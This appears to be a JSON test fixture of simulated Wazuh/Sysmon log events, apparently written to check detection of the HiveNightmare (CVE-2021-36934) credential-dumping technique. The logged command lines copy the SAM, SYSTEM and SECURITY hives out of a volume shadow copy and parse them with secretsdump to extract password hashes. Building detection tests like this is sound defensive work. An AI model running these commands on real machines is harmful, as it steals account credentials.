@@ -1,0 +1,404 @@
+{
+  "_metadata": {
+    "attack_id": "T1003.002",
+    "variation": "001",
+    "name": "HiveNightmare Shadow Copy SAM Extract (CVE-2021-36934)",
+    "description": "Non-admin user reads SAM/SYSTEM/SECURITY hives from volume shadow copies due to overly permissive ACLs (HiveNightmare/SeriousSAM). Copied hives are then parsed offline with secretsdump to extract credential hashes.",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "credential-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - icacls checking SAM file permissions to confirm vulnerability",
+      "sequence": 1,
+      "timestamp": "2026-02-21T14:30:00.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:30:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: icacls checking SAM registry hive permissions",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: Security Account Manager"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.400001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:30:00.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:30:00.000",
+              "processGuid": "{A1B2C3D4-4444-6600-0000-000000004001}",
+              "processId": "4100",
+              "image": "C:\\Windows\\System32\\icacls.exe",
+              "commandLine": "icacls C:\\Windows\\System32\\config\\SAM",
+              "currentDirectory": "C:\\Users\\lowpriv_user\\",
+              "user": "CORP\\lowpriv_user",
+              "logonGuid": "{A1B2C3D4-4444-6600-0000-000000004000}",
+              "logonId": "0x7b3e2",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=e05b1896c29f1f6eca3a51a69a89bc6da05a17e3a57b1dbb9b86c3b51b8a8e7c",
+              "parentProcessGuid": "{A1B2C3D4-4444-6600-0000-000000003999}",
+              "parentProcessId": "3080",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Copying SAM hive from volume shadow copy",
+      "sequence": 2,
+      "timestamp": "2026-02-21T14:30:08.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:30:08.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: SAM hive copied from volume shadow copy (HiveNightmare)",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: Security Account Manager"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.400002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:30:08.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:30:08.000",
+              "processGuid": "{A1B2C3D4-4444-6600-0000-000000004002}",
+              "processId": "4108",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Users\\Public\\SAM",
+              "currentDirectory": "C:\\Users\\lowpriv_user\\",
+              "user": "CORP\\lowpriv_user",
+              "logonGuid": "{A1B2C3D4-4444-6600-0000-000000004000}",
+              "logonId": "0x7b3e2",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874714",
+              "parentProcessGuid": "{A1B2C3D4-4444-6600-0000-000000003999}",
+              "parentProcessId": "3080",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Copying SYSTEM hive from volume shadow copy",
+      "sequence": 3,
+      "timestamp": "2026-02-21T14:30:12.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:30:12.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: SYSTEM hive copied from volume shadow copy (HiveNightmare)",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: Security Account Manager"
+            ]
+          },
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.400003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:30:12.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:30:12.000",
+              "processGuid": "{A1B2C3D4-4444-6600-0000-000000004003}",
+              "processId": "4112",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Users\\Public\\SYSTEM",
+              "currentDirectory": "C:\\Users\\lowpriv_user\\",
+              "user": "CORP\\lowpriv_user",
+              "logonGuid": "{A1B2C3D4-4444-6600-0000-000000004000}",
+              "logonId": "0x7b3e2",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874714",
+              "parentProcessGuid": "{A1B2C3D4-4444-6600-0000-000000003999}",
+              "parentProcessId": "3080",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Copying SECURITY hive from volume shadow copy",
+      "sequence": 4,
+      "timestamp": "2026-02-21T14:30:16.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:30:16.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: SECURITY hive copied from volume shadow copy (HiveNightmare)",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: Security Account Manager"
+            ]
+          },
+          "firedtimes": 4,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.400004",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:30:16.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:30:16.000",
+              "processGuid": "{A1B2C3D4-4444-6600-0000-000000004004}",
+              "processId": "4116",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY C:\\Users\\Public\\SECURITY",
+              "currentDirectory": "C:\\Users\\lowpriv_user\\",
+              "user": "CORP\\lowpriv_user",
+              "logonGuid": "{A1B2C3D4-4444-6600-0000-000000004000}",
+              "logonId": "0x7b3e2",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874714",
+              "parentProcessGuid": "{A1B2C3D4-4444-6600-0000-000000003999}",
+              "parentProcessId": "3080",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - secretsdump.py parsing extracted SAM/SYSTEM/SECURITY hives offline",
+      "sequence": 5,
+      "timestamp": "2026-02-21T14:30:25.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:30:25.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: secretsdump.py parsing extracted registry hives",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1003.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "OS Credential Dumping: Security Account Manager"
+            ]
+          },
+          "firedtimes": 5,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.400005",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:30:25.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:30:25.000",
+              "processGuid": "{A1B2C3D4-4444-6600-0000-000000004005}",
+              "processId": "4124",
+              "image": "C:\\Python39\\python3.exe",
+              "commandLine": "python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\lowpriv_user",
+              "logonGuid": "{A1B2C3D4-4444-6600-0000-000000004000}",
+              "logonId": "0x7b3e2",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=f2ca1bb6c7e907d06dafe4687e579fce76b37e4e93b7605022da52e6ccc26fd2",
+              "parentProcessGuid": "{A1B2C3D4-4444-6600-0000-000000003999}",
+              "parentProcessId": "3080",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    }
+  ]
+}
